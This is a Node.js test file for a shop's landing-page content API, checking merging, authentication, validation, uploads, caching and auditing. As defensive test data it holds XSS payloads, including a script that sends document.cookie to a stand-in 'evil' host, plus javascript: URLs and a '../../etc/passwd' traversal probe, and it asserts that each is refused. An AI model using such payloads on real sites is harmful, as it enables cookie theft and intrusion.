/**
 * The landing page's content, from the control plane out to the public URL.
 *
 * The owner must be able to change every word, price, bullet, phone number,
 * logo and photograph on `/kj` from the console — and the page must survive
 * every way that can go wrong: a control plane that is not there at all (the
 * shop-PC build), a stored document written by a hand edit or an older release,
 * and an owner who pastes markup into a field.
 *
 * Everything runs twice, once per driver, exactly as the rest of the suite
 * does. Here that means the CONTROL PLANE itself is opened on `node:sqlite` and
 * then on libSQL — a `file:` libSQL URL is the identical client, statement
 * encoding and row decoding a Turso URL takes, so the pair is a real
 * comparison. It matters more than usual for this feature: the document is a
 * long TEXT and the assets are BLOBs, and the two drivers disagree about BLOBs
 * (Uint8Array vs ArrayBuffer) in a way that would show up as a corrupted logo
 * on the hosted deployment and nowhere else.
 *
 * The switch is made by re-opening the control plane between the two passes:
 * `closePlatformDb()` drops the connection and the request middleware opens the
 * next one from `config.platform`, so both passes run against the real routes,
 * the real auth and the real server — not a copy of them.
 */
import test, { before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import zlib from 'node:zlib';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const dir = path.join(here, '..', 'data', 'landing-content-test');
fs.rmSync(dir, { recursive: true, force: true });
fs.mkdirSync(dir, { recursive: true });

process.env.MM_PLATFORM = '1';
process.env.MM_PLATFORM_DB = path.join(dir, 'platform.db');
process.env.MM_TENANTS_DIR = path.join(dir, 'tenants');
process.env.MM_DB_FILE = path.join(dir, 'root.db');
process.env.MM_PLATFORM_OWNER_PASSWORD = 'landing-owner-password';

const { createApp } = await import('../src/server.js');
const { initDb, applySchema, closeDb } = await import('../src/infrastructure/database/connection.js');
const { initPlatformDb, closePlatformDb, platformDb } = await import('../src/platform/db.js');
const { mergeLandingDocument, validateLandingDocument } = await import('../src/platform/landingDocument.js');
const config = (await import('../src/config/index.js')).default;

/**
 * The two ways this deployment's control plane is ever opened. `sqlite` is the
 * shop PC and a local console; `libsql` is Vercel + Turso, where every landing
 * page the owner actually shows a customer is served from.
 */
const DRIVERS = [
  { name: 'sqlite', settings: (file) => ({ driver: 'sqlite', url: '', databaseFile: file }) },
  { name: 'libsql', settings: (file) => ({ driver: 'libsql', url: `file:${file}`, databaseFile: file }) },
];

let base = '';
let server = null;

// ------------------------------------------------------------------- helpers

async function api(urlPath, { method = 'GET', body, cookie, headers = {} } = {}) {
  const res = await fetch(`${base}${urlPath}`, {
    method,
    headers: { 'Content-Type': 'application/json', ...(cookie ? { cookie } : {}), ...headers },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let data;
  try { data = JSON.parse(text); } catch { data = text; }
  return {
    status: res.status,
    data,
    header: (name) => res.headers.get(name),
    cookie: res.headers.get('set-cookie')?.split(';')[0] || cookie,
  };
}

/** A real PNG built here, so the bytes are known exactly and comparable. */
function png(width = 4, height = 4, [r, g, b, a] = [10, 20, 30, 255]) {
  const chunk = (type, body) => {
    const head = Buffer.alloc(8);
    head.writeUInt32BE(body.length, 0);
    head.write(type, 4, 'latin1');
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(zlib.crc32(Buffer.concat([Buffer.from(type, 'latin1'), body])), 0);
    return Buffer.concat([head, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 6; // RGBA — a logo's alpha channel must survive the round trip
  const raw = Buffer.concat(Array.from({ length: height }, () => Buffer.concat([
    Buffer.from([0]),
    ...Array.from({ length: width }, () => Buffer.from([r, g, b, a])),
  ])));
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', zlib.deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * A PNG that will not deflate: every pixel is random. A flat colour compresses
 * to a few kilobytes however large the picture is, which would make a size-cap
 * test pass for the wrong reason.
 */
function noisyPng(width, height) {
  const chunk = (type, body) => {
    const head = Buffer.alloc(8);
    head.writeUInt32BE(body.length, 0);
    head.write(type, 4, 'latin1');
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(zlib.crc32(Buffer.concat([Buffer.from(type, 'latin1'), body])), 0);
    return Buffer.concat([head, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 6;
  const raw = Buffer.concat(Array.from({ length: height }, () => Buffer.concat([
    Buffer.from([0]), crypto.randomBytes(width * 4),
  ])));
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', zlib.deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

const dataUrl = (bytes, declared = 'image/png') => `data:${declared};base64,${bytes.toString('base64')}`;

/** Writes a row nothing in this codebase would write — a hand edit, an old release. */
async function forceStoredDocument(text) {
  await platformDb().prepare(`
    INSERT INTO landing_content (id, document, version, updated_at, updated_by)
    VALUES (1, ?, 1, ?, NULL)
    ON CONFLICT(id) DO UPDATE SET document = excluded.document, updated_at = excluded.updated_at
  `).run(text, new Date().toISOString());
}

async function wipe() {
  await platformDb().prepare('DELETE FROM landing_content').run();
  await platformDb().prepare('DELETE FROM landing_assets').run();
  await platformDb().prepare('DELETE FROM platform_audit').run();
}

/**
 * The page's own defaults, standing in for `public/kj/defaults.js`. Small on purpose:
 * this fixture exists to state the merge rule, not to duplicate the copy.
 */
const faq = (n) => Array.from({ length: n }, (_, i) => ({ q: { en: `Q${i + 1}` }, a: { en: `A${i + 1}` } }));

const DEFAULTS_V1 = {
  version: 1,
  brand: { name: { en: 'KJ', ar: 'كي جيه' }, accent: '#4f46e5', logo: null },
  packages: {
    title: { en: 'Packages', ar: 'الباقات' },
    items: [
      { id: 'starter', name: { en: 'Starter' }, price: 1500, features: [{ en: 'POS' }] },
      { id: 'pro', name: { en: 'Pro' }, price: 3500, features: [{ en: 'POS' }, { en: 'Website' }] },
    ],
  },
  faq: { enabled: true, title: { en: 'FAQ' }, items: faq(6) },
};

/** The same page, one release later: a seventh FAQ entry has been written. */
const DEFAULTS_V2 = { ...DEFAULTS_V1, faq: { ...DEFAULTS_V1.faq, items: faq(7) } };

before(async () => {
  await initDb();
  await applySchema();
  await initPlatformDb();
  const app = createApp();
  server = await new Promise((resolve) => {
    const listening = app.listen(0, '127.0.0.1', () => resolve(listening));
  });
  base = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  if (server) await new Promise((resolve) => server.close(resolve));
  await closeDb();
  await closePlatformDb();
  fs.rmSync(dir, { recursive: true, force: true });
});

// =========================================================================
// The merge rule. Pure, so it is stated once rather than once per driver —
// which is the point: the rule is a property of the document, not of where
// the document is kept.
// =========================================================================

test('the merge rule: the owner keeps his price, and still receives a new FAQ entry', async (t) => {
  await t.test('the case that decided the rule', () => {
    // He edited one package's price. The console stores the section he touched;
    // `packages.items` goes whole, because a list is a list.
    const stored = {
      version: 1,
      packages: {
        items: [
          { id: 'starter', name: { en: 'Starter' }, price: 1500, features: [{ en: 'POS' }] },
          { id: 'pro', name: { en: 'Pro' }, price: 3900, features: [{ en: 'POS' }, { en: 'Website' }] },
        ],
      },
    };

    const merged = mergeLandingDocument(DEFAULTS_V2, stored);

    // His price survives the release.
    assert.equal(merged.packages.items[1].price, 3900);
    // A section he never touched follows the release: the seventh entry is his.
    assert.equal(merged.faq.items.length, 7);
    assert.equal(merged.faq.items[6].q.en, 'Q7');
    // And the parts of `packages` he did not touch still come from the page.
    assert.deepEqual(merged.packages.title, { en: 'Packages', ar: 'الباقات' });
  });

  await t.test('a list he DID curate does not grow behind his back', () => {
    const stored = { faq: { items: faq(6).slice(0, 5) } };
    const merged = mergeLandingDocument(DEFAULTS_V2, stored);
    assert.equal(merged.faq.items.length, 5, 'his five, not the release\'s seven');
    assert.equal(merged.faq.title.en, 'FAQ', 'the heading he never touched is still the page\'s');
    assert.equal(merged.faq.enabled, true);
  });

  await t.test('an object merges field by field, so one heading does not freeze a list', () => {
    const merged = mergeLandingDocument(DEFAULTS_V1, { packages: { title: { en: 'Plans' } } });
    assert.equal(merged.packages.title.en, 'Plans');
    assert.equal(merged.packages.title.ar, 'الباقات', 'the half he did not translate stays the default');
    assert.equal(merged.packages.items.length, 2, 'the list is untouched by a heading edit');
  });

  await t.test('null is a value and replaces — that is how a default badge is erased', () => {
    const merged = mergeLandingDocument({ packages: { badge: { en: 'Popular' } } }, { packages: { badge: null } });
    assert.equal(merged.packages.badge, null);
  });

  await t.test('an empty stored document is exactly the page that ships', () => {
    assert.deepEqual(mergeLandingDocument(DEFAULTS_V2, { version: 1 }), { ...DEFAULTS_V2, version: 1 });
  });
});

// =========================================================================
// Everything below runs against the real HTTP surface, once per driver.
// =========================================================================

test('the landing content API, on both drivers', async (t) => {
  for (const driver of DRIVERS) {
    await t.test(driver.name, async (dt) => {
      // Re-open the control plane on this driver. `config.platform` is a plain
      // object behind a shallow freeze, and `controlPlaneDescriptor()` reads it
      // on every open — so the routes, the auth and the middleware are all the
      // real ones, pointed at a different database.
      await closePlatformDb();
      Object.assign(config.platform, driver.settings(path.join(dir, `control-${driver.name}.db`)));
      await initPlatformDb();
      await wipe();

      const login = await api('/api/platform/auth/login', {
        method: 'POST',
        body: { username: 'owner', password: 'landing-owner-password' },
      });
      assert.equal(login.status, 200, 'the owner can sign in on this control plane');
      const cookie = login.cookie;

      // ------------------------------------------------------------ the public route

      await dt.test('answers an empty document before anything is stored, with no session', async () => {
        const res = await api('/api/landing');
        assert.equal(res.status, 200);
        assert.deepEqual(res.data, { version: 1, assets: {} });
      });

      await dt.test('the public document is no-store — a save in one tab must show in another', async () => {
        const res = await api('/api/landing');
        const cacheControl = res.header('cache-control') || '';
        assert.match(cacheControl, /no-store/, 'a cached landing document is a stale price');
      });

      await dt.test('the owner routes are closed without a session, and open with one', async () => {
        for (const [method, urlPath] of [
          ['GET', '/api/platform/landing'],
          ['PUT', '/api/platform/landing'],
          ['POST', '/api/platform/landing/asset/logo'],
          ['DELETE', '/api/platform/landing/asset/logo'],
        ]) {
          const res = await api(urlPath, { method, body: method === 'GET' ? undefined : {} });
          assert.equal(res.status, 401, `${method} ${urlPath} must require the owner session`);
        }
        assert.equal((await api('/api/platform/landing', { cookie })).status, 200);
      });

      await dt.test('an ERP session is not an owner session', async () => {
        const res = await api('/api/platform/landing', { cookie: 'mm_session=not-a-platform-token' });
        assert.equal(res.status, 401);
      });

      // ------------------------------------------------------------------ saving

      await dt.test('what the owner saves is what the page reads back', async () => {
        const document = {
          version: 1,
          brand: { name: { en: 'KJ', ar: 'كي جيه' }, accent: '4F46E5' },
          contact: { phone: '0155 252 6142', whatsapp: '01552526142', email: 'kj@example.com' },
          packages: {
            items: [
              { id: 'pro', name: { en: 'Pro', ar: 'برو' }, price: 3900, featured: true, features: [{ en: 'POS', ar: 'كاشير' }] },
            ],
          },
          faq: { enabled: true, items: [{ q: { en: 'How?' }, a: { en: 'Like this.' } }] },
        };
        const put = await api('/api/platform/landing', { method: 'PUT', cookie, body: document });
        assert.equal(put.status, 200, JSON.stringify(put.data));

        const page = await api('/api/landing');
        assert.equal(page.status, 200);
        assert.equal(page.data.packages.items[0].price, 3900);
        assert.equal(page.data.contact.phone, '0155 252 6142');
        assert.equal(page.data.brand.name.ar, 'كي جيه');
        // A colour is normalised on the way in, so only #rrggbb can ever reach a
        // custom property on the page.
        assert.equal(page.data.brand.accent, '#4f46e5');
      });

      await dt.test('a price is a number, in a sane range', async () => {
        const bad = async (price) => {
          const res = await api('/api/platform/landing', {
            method: 'PUT', cookie, body: { packages: { items: [{ id: 'pro', price }] } },
          });
          return res.status;
        };
        assert.equal(await bad('3500'), 422, 'a formatted string is not a price');
        assert.equal(await bad('٣٥٠٠'), 422, 'the page renders Arabic numerals; the store keeps a number');
        assert.equal(await bad(-1), 422);
        assert.equal(await bad(9_999_999), 422);
        const good = await api('/api/platform/landing', {
          method: 'PUT', cookie, body: { packages: { items: [{ id: 'pro', price: 3500.456 }] } },
        });
        assert.equal(good.status, 200);
        assert.equal(good.data.packages.items[0].price, 3500.46, 'rounded to money, not floated');
      });

      await dt.test('a colour must be a colour', async () => {
        const res = await api('/api/platform/landing', {
          method: 'PUT', cookie, body: { brand: { accent: 'red; background:url(//evil)' } },
        });
        assert.equal(res.status, 422);
      });

      // --------------------------------------------------- markup cannot escape

      await dt.test('a hostile string is refused on write, in every field shape', async () => {
        const attempts = [
          { hero: { title: { en: '<script>alert(1)</script>' } } },
          { hero: { trust: [{ ar: '<img src=x onerror=alert(1)>' }] } },
          { packages: { items: [{ id: 'pro', features: [{ en: 'Nice <b>bold</b>' }] }] } },
          { faq: { items: [{ q: { en: 'ok' }, a: { en: 'see <a href=#>this</a>' } }] } },
          { quotes: { items: [{ name: '<svg onload=alert(1)>' }] } },
          { footer: { line: { en: '</div><iframe src=//evil>' } } },
        ];
        for (const body of attempts) {
          const res = await api('/api/platform/landing', { method: 'PUT', cookie, body });
          assert.equal(res.status, 422, `must refuse: ${JSON.stringify(body)}`);
        }
      });

      await dt.test('markup that was written straight into the row never reaches the page', async () => {
        // The write path is not the only way a row appears: a hand edit, a
        // restored backup, an older release. Validation runs on READ too.
        await forceStoredDocument(JSON.stringify({
          version: 1,
          hero: { title: { en: '<script>fetch("//evil?c="+document.cookie)</script>' } },
        }));
        const page = await api('/api/landing');
        assert.equal(page.status, 200, 'and it still answers 200 — the page must not go down');
        assert.deepEqual(page.data, { version: 1, assets: {} }, 'it is served as if nothing were stored');
        assert.ok(!JSON.stringify(page.data).includes('<script'), 'no markup anywhere in the answer');
        await wipe();
      });

      await dt.test('a control character cannot smuggle a bracket past the check', async () => {
        const res = await api('/api/platform/landing', {
          method: 'PUT', cookie, body: { hero: { title: { en: ' < script>' } } },
        });
        assert.equal(res.status, 422);
      });

      // ------------------------------------------------- a malformed document

      await dt.test('a malformed stored document falls back instead of throwing', async () => {
        for (const junk of [
          'not json at all',
          '[]',
          'null',
          JSON.stringify({ version: 1, packages: { items: [{ price: 'free' }] } }),
          JSON.stringify({ version: 9, brand: { name: { en: 'From the future' } } }),
          JSON.stringify({ version: 1, brand: { accent: 'octarine' } }),
        ]) {
          await forceStoredDocument(junk);
          const page = await api('/api/landing');
          assert.equal(page.status, 200, `must not 500 on: ${junk.slice(0, 40)}`);
          assert.deepEqual(page.data, { version: 1, assets: {} });
        }

        // The console is told the truth about it, so it is fixable rather than
        // invisible — the page is what has to shrug, not the owner.
        const owner = await api('/api/platform/landing', { cookie });
        assert.equal(owner.status, 200);
        assert.equal(owner.data.malformed, true);
        assert.deepEqual(owner.data.document, {});
        await wipe();
      });

      await dt.test('a save over a malformed document repairs it', async () => {
        await forceStoredDocument('{{{');
        const put = await api('/api/platform/landing', {
          method: 'PUT', cookie, body: { brand: { name: { en: 'KJ' } } },
        });
        assert.equal(put.status, 200);
        assert.equal((await api('/api/landing')).data.brand.name.en, 'KJ');
      });

      // ----------------------------------------------------------- URL fields

      await dt.test('a URL field only ever holds a path this server minted', async () => {
        const put = await api('/api/platform/landing', {
          method: 'PUT',
          cookie,
          body: {
            brand: { name: { en: 'KJ' }, logo: 'https://evil.example/track.gif' },
            hero: { image: 'javascript:alert(1)' },
            shots: { items: [{ key: 'pos', kind: 'desktop', custom: 'data:text/html,<script>alert(1)</script>' }] },
          },
        });
        assert.equal(put.status, 200);
        const page = await api('/api/landing');
        assert.equal(page.data.brand.logo, undefined, 'no logo is uploaded, so there is no logo URL');
        assert.equal(page.data.hero?.image, undefined);
        assert.equal(page.data.shots.items[0].custom, undefined);
        assert.ok(!JSON.stringify(page.data).includes('evil.example'));
        assert.ok(!JSON.stringify(page.data).includes('javascript:'));
      });

      // -------------------------------------------------------------- uploads

      await dt.test('an upload that is not an image is refused, whatever it claims to be', async () => {
        const notAnImage = Buffer.from('<html><script>alert(1)</script></html>', 'utf8');
        const refusals = [
          dataUrl(notAnImage, 'image/png'),
          dataUrl(notAnImage, 'image/svg+xml'),
          dataUrl(Buffer.from('GIF89a' + 'x'.repeat(64), 'latin1'), 'image/gif'),
          'https://evil.example/logo.png',
          '',
        ];
        for (const payload of refusals) {
          const res = await api('/api/platform/landing/asset/logo', {
            method: 'POST', cookie, body: { data: payload },
          });
          assert.equal(res.status, 422, `must refuse ${String(payload).slice(0, 32)}`);
        }
        assert.equal((await api('/api/landing/asset/logo')).status, 404, 'and nothing was stored');
      });

      await dt.test('an upload over the slot\'s size cap is refused', async () => {
        // Random pixels, so deflate cannot squeeze it under the ceiling.
        const big = noisyPng(400, 400);
        assert.ok(big.length > 400 * 1024, `the fixture must out-run the cap (${big.length})`);
        const res = await api('/api/platform/landing/asset/logo', {
          method: 'POST', cookie, body: { data: dataUrl(big) },
        });
        assert.equal(res.status, 422, `expected a refusal for ${big.length} bytes`);
        assert.match(res.data.error.message, /limit/i);
      });

      await dt.test('an uploaded logo is served back byte for byte, and named in the document', async () => {
        const bytes = png(8, 8, [10, 20, 30, 128]);
        const upload = await api('/api/platform/landing/asset/logo', {
          method: 'POST', cookie, body: { data: dataUrl(bytes) },
        });
        assert.equal(upload.status, 200, JSON.stringify(upload.data));
        assert.equal(upload.data.contentType, 'image/png');
        assert.equal(upload.data.width, 8);

        const page = await api('/api/landing');
        const url = page.data.brand.logo;
        assert.match(url, /^\/api\/landing\/asset\/logo\?v=[0-9a-f]{10}$/);
        assert.equal(page.data.assets.logo, url);

        const served = await fetch(`${base}${url}`);
        assert.equal(served.status, 200);
        assert.equal(served.headers.get('content-type'), 'image/png');
        const back = Buffer.from(await served.arrayBuffer());
        assert.ok(back.equals(bytes), 'nothing re-encodes a logo — the alpha channel survives');
      });

      await dt.test('the content type is sniffed from the bytes, not from what was claimed', async () => {
        const bytes = png(6, 6);
        const upload = await api('/api/platform/landing/asset/hero', {
          method: 'POST', cookie, body: { data: dataUrl(bytes, 'image/jpeg') },
        });
        assert.equal(upload.status, 200);
        assert.equal(upload.data.contentType, 'image/png');
        const served = await fetch(`${base}${upload.data.url}`);
        assert.equal(served.headers.get('content-type'), 'image/png');
      });

      // ---------------------------------------------------------- asset cache

      await dt.test('the bytes cache for a year at the versioned URL, and briefly without it', async () => {
        const page = await api('/api/landing');
        const url = page.data.brand.logo;

        const versioned = await fetch(`${base}${url}`);
        assert.match(versioned.headers.get('cache-control'), /max-age=31536000/);
        assert.match(versioned.headers.get('cache-control'), /immutable/);
        // `Pragma: no-cache` from the /api guard would contradict it.
        assert.equal(versioned.headers.get('pragma'), null);

        const bare = await fetch(`${base}/api/landing/asset/logo`);
        assert.equal(bare.status, 200);
        assert.doesNotMatch(bare.headers.get('cache-control'), /immutable/,
          'a hand-typed URL must never pin a replaced logo in a cache for a year');

        const stale = await fetch(`${base}/api/landing/asset/logo?v=0000000000`);
        assert.doesNotMatch(stale.headers.get('cache-control'), /immutable/);

        const conditional = await fetch(`${base}${url}`, {
          headers: { 'if-none-match': versioned.headers.get('etag') },
        });
        assert.equal(conditional.status, 304, 'a browser that asks again gets no bytes');
      });

      await dt.test('a replaced logo appears immediately, at a new address', async () => {
        const before = (await api('/api/landing')).data.brand.logo;
        const replacement = png(8, 8, [255, 0, 0, 255]);
        const upload = await api('/api/platform/landing/asset/logo', {
          method: 'POST', cookie, body: { data: dataUrl(replacement) },
        });
        assert.equal(upload.status, 200);

        const after = (await api('/api/landing')).data.brand.logo;
        assert.notEqual(after, before, 'the version tag moves with the bytes');

        const served = Buffer.from(await (await fetch(`${base}${after}`)).arrayBuffer());
        assert.ok(served.equals(replacement), 'and the new bytes are what is served');
      });

      await dt.test('deleting an override brings the built-in picture back', async () => {
        const del = await api('/api/platform/landing/asset/logo', { method: 'DELETE', cookie });
        assert.equal(del.status, 200);
        const page = await api('/api/landing');
        assert.equal(page.data.brand.logo, undefined, 'the page falls back to its own default');
        assert.equal(page.data.assets.logo, undefined);
        assert.equal((await api('/api/landing/asset/logo')).status, 404);
        assert.equal((await api('/api/platform/landing/asset/logo', { method: 'DELETE', cookie })).status, 404);
      });

      await dt.test('a screenshot override answers on its own slot', async () => {
        const bytes = png(10, 6, [0, 128, 255, 255]);
        const upload = await api('/api/platform/landing/asset/shot-pos', {
          method: 'POST', cookie, body: { data: dataUrl(bytes) },
        });
        assert.equal(upload.status, 200);

        await api('/api/platform/landing', {
          method: 'PUT', cookie, body: { shots: { items: [{ key: 'pos', kind: 'desktop', caption: { en: 'The till' } }] } },
        });
        const page = await api('/api/landing');
        assert.match(page.data.shots.items[0].custom, /^\/api\/landing\/asset\/shot-pos\?v=/);
        // And it is listed regardless of whether the shots list was edited,
        // because a slot the owner replaced without touching the list has no
        // stored item to hang a URL on.
        assert.equal(page.data.assets['shot-pos'], page.data.shots.items[0].custom);
        await api('/api/platform/landing/asset/shot-pos', { method: 'DELETE', cookie });
      });

      await dt.test('a slot this page has no place for is a 404, not a hint', async () => {
        assert.equal((await api('/api/landing/asset/../../etc/passwd')).status, 404);
        assert.equal((await api('/api/landing/asset/secrets')).status, 404);
        const res = await api('/api/platform/landing/asset/secrets', {
          method: 'POST', cookie, body: { data: dataUrl(png()) },
        });
        assert.equal(res.status, 422, 'and an owner who names one is told so');
      });

      // ---------------------------------------------------------------- audit

      await dt.test('a content change is as traceable as a tenant change — without the body', async () => {
        await wipe();
        await api('/api/platform/landing', {
          method: 'PUT',
          cookie,
          body: {
            packages: { items: [{ id: 'pro', price: 4200 }] },
            faq: { items: [{ q: { en: 'Secret question' }, a: { en: 'Secret answer' } }] },
          },
        });
        await api('/api/platform/landing/asset/logo', { method: 'POST', cookie, body: { data: dataUrl(png()) } });
        await api('/api/platform/landing/asset/logo', { method: 'DELETE', cookie });

        const rows = await platformDb()
          .prepare('SELECT platform_user_id, action, detail FROM platform_audit ORDER BY id').all();
        assert.deepEqual(rows.map((r) => r.action), ['LANDING_UPDATE', 'LANDING_ASSET_SET', 'LANDING_ASSET_CLEAR']);
        for (const row of rows) assert.ok(row.platform_user_id, 'every row names who did it');

        const update = JSON.parse(rows[0].detail);
        assert.deepEqual(update.sections, ['faq', 'packages'], 'which sections moved is the useful part');
        assert.ok(update.bytes > 0);
        assert.ok(!rows[0].detail.includes('Secret'), 'the page copy does not belong in the audit log');
        assert.ok(!rows[0].detail.includes('4200'), 'nor does a price — the section name is the pointer');

        assert.equal(JSON.parse(rows[1].detail).slot, 'logo');
        assert.equal(JSON.parse(rows[1].detail).contentType, 'image/png');
        await wipe();
      });

      // --------------------------------------------------- the whole round trip

      await dt.test('the owner view carries what the console needs to edit against', async () => {
        await api('/api/platform/landing', {
          method: 'PUT', cookie, body: { packages: { items: [{ id: 'pro', price: 3900 }] } },
        });
        const owner = await api('/api/platform/landing', { cookie });
        assert.equal(owner.status, 200);
        assert.equal(owner.data.document.packages.items[0].price, 3900);
        assert.equal(owner.data.malformed, false);
        assert.ok(owner.data.updatedAt, 'when it was last saved');
        // The defaults are the page's, not the server's — see ownerView().
        assert.equal(owner.data.defaults, null);
        assert.equal(owner.data.defaultsUrl, '/kj/defaults.js');

        // And the stored half merged onto the page's defaults is the page.
        const stored = (await api('/api/landing')).data;
        const merged = mergeLandingDocument(DEFAULTS_V2, stored);
        assert.equal(merged.packages.items[0].price, 3900);
        assert.equal(merged.faq.items.length, 7);
        await wipe();
      });
    });
  }
});

// =========================================================================
// The single-shop build: no control plane at all.
// =========================================================================

test('a deployment with no control plane serves the page rather than an error', async (t) => {
  await t.test('the service answers the empty document, not an exception', async () => {
    await closePlatformDb();
    const { LandingContentService } = await import('../src/platform/LandingContentService.js');
    const service = new LandingContentService();
    assert.deepEqual(await service.publicDocument(), { version: 1, assets: {} });
    assert.equal(await service.assetBytes('logo'), null);
  });

  await t.test('and so does the route, in a build where the platform is switched off', async () => {
    // Rebuilt with the fleet off, which is what the shop PC's launcher does.
    // Nothing here has a control plane to read, and the page must still load.
    config.platform.enabled = false;
    const app = createApp();
    const listening = await new Promise((resolve) => {
      const s = app.listen(0, '127.0.0.1', () => resolve(s));
    });
    const port = listening.address().port;
    try {
      const res = await fetch(`http://127.0.0.1:${port}/api/landing`);
      assert.equal(res.status, 200);
      assert.match(res.headers.get('cache-control') || '', /no-store/);
      assert.deepEqual(await res.json(), { version: 1, assets: {} });

      const asset = await fetch(`http://127.0.0.1:${port}/api/landing/asset/logo`);
      assert.equal(asset.status, 404, 'a 404 for the bytes, never a 500');

      // The owner routes do not exist here at all — there is no console, so
      // `/api/platform/...` falls through to the ERP's own router and is
      // refused there. Unreachable is the assertion; which flavour of refusal
      // is the single-shop build's business.
      const owner = await fetch(`http://127.0.0.1:${port}/api/platform/landing`);
      assert.ok(owner.status === 401 || owner.status === 404, `expected a refusal, got ${owner.status}`);
    } finally {
      await new Promise((resolve) => listening.close(resolve));
      config.platform.enabled = true;
    }
  });
});

// =========================================================================
// The validator, directly — the cases a route test cannot express.
// =========================================================================

test('the validator is the security boundary', async (t) => {
  await t.test('an unknown key is dropped, not rejected', () => {
    const result = validateLandingDocument({ brand: { name: { en: 'KJ' }, onclick: 'alert(1)' }, mystery: {} });
    assert.equal(result.ok, true);
    assert.equal(result.document.brand.onclick, undefined);
    assert.equal(result.document.mystery, undefined);
  });

  await t.test('a list longer than its cap is refused', () => {
    assert.equal(validateLandingDocument({ faq: { items: Array.from({ length: 40 }, () => ({ q: { en: 'x' } })) } }).ok, true);
    assert.equal(validateLandingDocument({ faq: { items: Array.from({ length: 41 }, () => ({ q: { en: 'x' } })) } }).ok, false);
  });

  await t.test('a document larger than the byte cap is refused even when every field is legal', () => {
    // Each string is inside its own limit and each list inside its own count;
    // together they are more than a quarter of a megabyte, which is the ceiling
    // that stops the control plane being used as a document store.
    const huge = {
      packages: {
        items: Array.from({ length: 8 }, (_, i) => ({
          id: `p${i}`,
          features: Array.from({ length: 40 }, () => ({ en: 'a'.repeat(300), ar: 'ب'.repeat(300) })),
        })),
      },
      faq: { items: Array.from({ length: 40 }, () => ({ q: { en: 'q'.repeat(300) }, a: { en: 'a'.repeat(2000), ar: 'ب'.repeat(2000) } })) },
    };
    const result = validateLandingDocument(huge);
    assert.equal(result.ok, false);
    assert.match(result.issues[0].message, /limit is 256 KB/);
  });

  await t.test('an array where an object belongs is refused', () => {
    assert.equal(validateLandingDocument([]).ok, false);
    assert.equal(validateLandingDocument(null).ok, false);
    assert.equal(validateLandingDocument('a string').ok, false);
  });

  await t.test('a bidi override cannot be stored to reverse a price line', () => {
    const result = validateLandingDocument({ packages: { currency: { ar: '‮جنيه' } } });
    assert.equal(result.ok, true);
    assert.equal(result.document.packages.currency.ar, 'جنيه');
  });
});
